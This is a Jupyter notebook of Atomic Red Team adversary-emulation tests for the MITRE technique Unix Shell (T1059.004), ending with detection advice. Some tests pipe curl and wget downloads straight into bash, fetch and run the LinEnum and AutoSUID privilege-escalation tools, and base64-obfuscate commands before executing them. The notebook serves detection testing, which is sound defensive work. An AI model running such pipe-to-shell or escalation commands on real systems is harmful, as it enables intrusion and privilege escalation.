{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "45a3b62e",
   "metadata": {},
   "source": "# T1059.004 - Unix Shell\nAdversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence."
  },
  {
   "cell_type": "markdown",
   "id": "1de0e1dd",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "0e8a04ef",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Create and Execute Bash Shell Script",
    "Creates and executes a simple sh script.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a8970f08",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "571c4e62",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/art.sh\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a633b635",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f831c988",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Command-Line Interface",
    "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncurl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e8e5879",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ad2bd06b",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/art-fish.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78dbeb61",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "03c77564",
   "metadata": {},
   "source": "### Atomic Test #3 - Harvest SUID executable files\nAutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: AutoSUID must exist on disk at specified location (#{autosuid})\n\n##### Check Prereq Commands:\n```sh\nif [ -f PathToAtomicsFolder/T1059.004/src/AutoSUID.sh ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\ncurl --create-dirs https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh --output PathToAtomicsFolder/T1059.004/src/AutoSUID.sh\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a4c4a76",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a1a00dae",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nchmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh\nbash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "270f749c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "62553f28",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf PathToAtomicsFolder/T1059.004/src/AutoSUID.sh\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c3f4018a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "40961d0f",
   "metadata": {},
   "source": "### Atomic Test #4 - LinEnum tool execution\nLinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: LinnEnum must exist on disk at specified location (#{linenum})\n\n##### Check Prereq Commands:\n```sh\nif [ -f PathToAtomicsFolder/T1059.004/src/LinEnum.sh ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\ncurl --create-dirs https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh --output PathToAtomicsFolder/T1059.004/src/LinEnum.sh\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ee8bb1c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "35491067",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nchmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh\nbash PathToAtomicsFolder/T1059.004/src/LinEnum.sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e30cedf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "79694168",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf PathToAtomicsFolder/T1059.004/src/LinEnum.sh\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "28a23c11",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5068ac2f",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - New script file in the tmp directory",
    "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nTMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1775510",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "41648a31",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm $TMPFILE\nunset TMPFILE\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc78e670",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1fe9b566",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - What shell is running",
    "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho $0\nif $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15693a07",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "0dd34226",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - What shells are available",
    "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncat /etc/shells \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f93a6a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "72b1154b",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Command line scripts",
    "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nfor i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14fd4f51",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "7608b249",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Obfuscated command line scripts",
    "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86880adc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "670a4f98",
   "metadata": {},
   "source": "### Atomic Test #10 - Change login shell\nAn adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: chsh - change login shell, must be installed\n\n##### Check Prereq Commands:\n```bash\nif [ -f /usr/bin/chsh ]; then echo \"exit 0\"; else echo \"exit 1\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\necho \"Automated installer not implemented yet, please install chsh manually\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ac385cd4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "33279a04",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\n[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e9c5dba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "3cd8be4c",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\n[ \"$(uname)\" = 'FreeBSD' ] && rmuser -y art || userdel art\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98b40fb7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c1b2f7f1",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Environment variable scripts",
    "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nexport ART='echo \"Atomic Red Team was here... T1059.004\"'\necho $ART |/bin/sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15317782",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "18c478b5",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nunset ART\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5355e27e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3effeea2",
   "metadata": {},
   "source": "### Atomic Test #12 - Detecting pipe-to-shell\nAn adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Check if curl is installed on the machine.\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\nwhich apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "134a8b82",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6ada3df2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncd /tmp\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash\nls -la /tmp/art.txt      \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "379ca2a8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "ca7ed270",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/art.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cebc92dc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ac5a61d0",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Current kernel information enumeration",
    "An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nuname -srm\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07bdc30a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.004 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "36184c70",
   "metadata": {},
   "source": "## Detection\nUnix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}